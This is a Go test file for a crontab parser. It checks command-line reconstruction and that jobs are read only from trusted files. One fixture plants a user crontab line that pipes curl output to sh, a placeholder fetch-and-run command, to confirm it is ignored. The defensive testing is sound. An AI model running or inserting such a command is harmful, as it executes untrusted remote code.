// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Paul Borile

package cron

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The stock Debian/Ubuntu /etc/crontab.
const debianCrontab = `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
# m h dom mon dow user	command
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
`

func TestParseDebianCrontab(t *testing.T) {
	jobs := Parse(strings.NewReader(debianCrontab), "/etc/crontab", true)
	if len(jobs) != 3 {
		t.Fatalf("want 3 jobs, got %+v", jobs)
	}
	// The exact command line seen in production on the cron.daily shell.
	want := "/bin/sh -c test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }"
	if jobs[1].Cmdline != want {
		t.Errorf("job = %q\nwant  %q", jobs[1].Cmdline, want)
	}
}

func TestParseVariants(t *testing.T) {
	in := `SHELL=/bin/bash
@daily  root  /usr/local/bin/backup.sh --full
*/5 * * * * root echo hi % stdin   
MAILTO=root
0 1 * * *   /usr/bin/without-user-field
`
	jobs := Parse(strings.NewReader(in), "/etc/cron.d/x", true)
	// the %-line is skipped; the last line lacks the user field a system crontab
	// needs (cron rejects it too), so it yields no job
	if len(jobs) != 1 {
		t.Fatalf("want 1 job, got %+v", jobs)
	}
	if jobs[0].Cmdline != "/bin/bash -c /usr/local/bin/backup.sh --full" {
		t.Errorf("@daily with SHELL: %q", jobs[0].Cmdline)
	}
	// root's own crontab has no user field
	user := Parse(strings.NewReader("0 3 * * * /usr/sbin/logrotate /etc/logrotate.conf\n"), "/var/spool/cron/crontabs/root", false)
	if len(user) != 1 || user[0].Cmdline != "/bin/sh -c /usr/sbin/logrotate /etc/logrotate.conf" {
		t.Errorf("root crontab: %+v", user)
	}
}

func TestJobsOnlyFromTrustedFiles(t *testing.T) {
	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0o755)
	os.MkdirAll(filepath.Join(root, "var/spool/cron/crontabs"), 0o755)
	os.WriteFile(filepath.Join(root, "etc/crontab"), []byte(debianCrontab), 0o644)
	os.WriteFile(filepath.Join(root, "etc/cron.d/certbot"), []byte("0 */12 * * * root certbot -q renew\n"), 0o644)
	os.WriteFile(filepath.Join(root, "etc/cron.d/skip.dpkg-old"), []byte("0 0 * * * root evil\n"), 0o644)
	os.WriteFile(filepath.Join(root, "var/spool/cron/crontabs/www-data"), []byte("* * * * * curl x|sh\n"), 0o600)

	all := Jobs(root, func(string) bool { return true })
	if _, ok := all["/bin/sh -c certbot -q renew"]; !ok || len(all) != 4 {
		t.Errorf("trusted files: %v", all)
	}
	for cmd := range all {
		if strings.Contains(cmd, "curl") || strings.Contains(cmd, "evil") {
			t.Errorf("must not read other users' crontabs or ignored cron.d names: %q", cmd)
		}
	}
	none := Jobs(root, func(p string) bool { return !strings.HasSuffix(p, "/etc/crontab") })
	if _, ok := none["/bin/sh -c cd / && run-parts --report /etc/cron.hourly"]; ok {
		t.Error("an untrusted /etc/crontab must be ignored")
	}
}
